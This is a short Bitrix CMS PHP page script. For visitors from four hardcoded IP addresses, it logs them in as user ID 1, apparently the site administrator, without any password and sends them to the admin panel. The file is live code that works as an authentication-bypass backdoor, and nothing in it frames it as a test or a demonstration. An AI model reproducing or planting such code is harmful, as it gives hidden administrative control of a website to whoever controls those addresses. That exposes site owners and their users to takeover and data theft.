<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");

if($_SERVER['REMOTE_ADDR'] == '212.164.234.151' || $_SERVER['REMOTE_ADDR'] == '212.164.215.44' || $_SERVER['REMOTE_ADDR'] == '93.91.162.246' || $_SERVER['REMOTE_ADDR'] ==  '178.49.143.70')
{
	global $USER;
	$USER->Authorize(1);
	LocalRedirect('/bitrix/admin/');
}

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/epilog_after.php");?>